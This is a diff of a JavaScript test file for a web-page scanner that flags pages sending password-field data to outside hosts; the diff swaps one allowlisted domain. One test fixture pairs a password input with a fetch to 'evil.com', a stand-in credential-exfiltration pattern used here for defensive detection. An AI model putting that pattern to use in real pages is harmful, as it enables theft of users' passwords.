@@ -77,7 +77,7 @@ assert(r.block.length === 0, "a normal page is not blocked");
   assert(!leak(`<input type="password"><script>fetch("/api/x")</script>`), "fetching its own address is fine");
   assert(!leak(`<script>fetch("https://api.weather.com/x")</script><input name="email">`), "calling an outside API without a password field is fine");
   assert(!leak(`<title>My Gym</title><p>Made with Nebulux AI</p><input type="password">`), "a login demo that only mentions Nebulux AI in the text is fine");
-  assert(!leak(`<input type="password"><script>fetch("https://nova.blackhole-ai-tech.com/x")</script>`), "sending to a Nebulux AI address is fine");
+  assert(!leak(`<input type="password"><script>fetch("https://nova.nebuluxai.com/x")</script>`), "sending to a Nebulux AI address is fine");
   const s = scanPage(`<input type="password"><script>fetch("https://evil.com/x")</script>`);
   assert(s.flag === "red" && s.block.length === 1, "the scan flags it red and refuses publishing");
 }
